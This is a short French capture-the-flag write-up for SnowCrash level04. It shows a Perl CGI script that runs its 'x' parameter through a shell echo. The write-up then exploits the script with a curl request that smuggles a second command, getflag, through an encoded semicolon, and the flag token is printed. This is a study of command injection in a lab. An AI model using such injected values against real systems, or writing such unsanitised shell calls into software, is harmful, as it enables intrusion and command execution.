Un fichier .perl est présent

Si on regarde son contenu il y a : 
```perl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

Ce qui nous indique que sur l'endpoint localhost:4747 il y a une fonction **x** qui éxécuté un **echo** du paramètre *x*.

Donc en passant le bon argument on peut éxécuter directement la commande getflag :
```bash
curl http://localhost:4747/?x=FoundIt%3Bgetflag
```

Il écrira FoundIt puis grâce au ; (%3B) il éxécutera la commande suivante. (*getflag*)

```bash
level04@SnowCrash:~$ curl http://localhost:4747/?x=FoundIt%3Bgetflag
FoundIt
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```